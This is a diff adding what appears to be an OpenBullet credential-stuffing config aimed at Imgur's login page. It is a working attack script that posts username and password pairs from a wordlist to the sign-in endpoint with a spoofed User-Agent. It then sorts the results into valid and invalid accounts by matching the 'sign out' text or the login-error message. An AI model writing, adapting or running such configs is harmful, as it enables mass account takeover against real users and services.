@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "imgur",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-21T14:29:54.131504-07:00",
+  "AdditionalInfo": "",
+  "Author": "Dr.Amr",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Some_inf_ REQUEST POST "https://imgur.com/signin?redirect=https%3A%2F%2Fimgur.com%2F" EncodeContent=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&remember=remember&submit=&_jafo%5BactiveExperiments%5D=%5B%7B%22expID%22%3A%22expCOM312%22%2C%22variation%22%3A%22treatment%22%7D%5D&_jafo%5BexperimentData%5D=%7B%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\">sign out<" 
+  KEYCHAIN Failure OR 
+    KEY "Your login information was incorrect." 
+
